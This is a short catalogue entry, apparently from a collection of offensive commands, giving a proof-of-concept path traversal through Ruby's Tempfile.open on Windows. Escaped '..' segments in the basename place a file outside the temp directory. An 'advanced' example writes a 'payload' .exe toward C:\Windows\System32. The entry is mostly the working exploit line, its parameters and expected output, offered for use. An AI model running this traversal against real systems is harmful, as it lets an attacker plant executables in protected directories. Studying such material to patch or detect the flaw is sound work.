---
data: 'Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])'
tags:
  - path-traversal
  - poc
type: command
executor: irb
platforms:
  - Windows
  - Ruby
id: 9aa27004-64b6-4b04-8d9c-379a9c7073b9
created_at: '2025-12-14T17:26:22.884Z'
updated_at: '2025-12-14T17:26:22.884Z'
verified: false
validated: true
submitted: true
---
# tempfile-open-traversal-poc

## Command

```ruby
Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])
```

## Description

Invokes Ruby's Tempfile.open with a basename array using escaped backslashes for path traversal on Windows, creating a file in C:\Users\rootx\ instead of the temp directory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| basename | Array with traversal string like "\\..\\..\\..\\..\\..\\Users\\rootx\\malicious" | Yes |
| ext | File extension like ".rb" | Yes |

## Examples

### Basic Usage

```ruby
Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])
```

### Advanced Usage

```ruby
Tempfile.open(["\\..\\..\\C:\\Windows\\System32\\payload",".exe"]) { |f| f.write("malicious code") }
```

## Expected Output

#<Tempfile:C:/Users/rootx/AppData/Local/Temp\..\..\..\..\..\Users\rootx\malicious20210321-22472-fvuodx.rb>

## Related

- [[Related Procedure]]
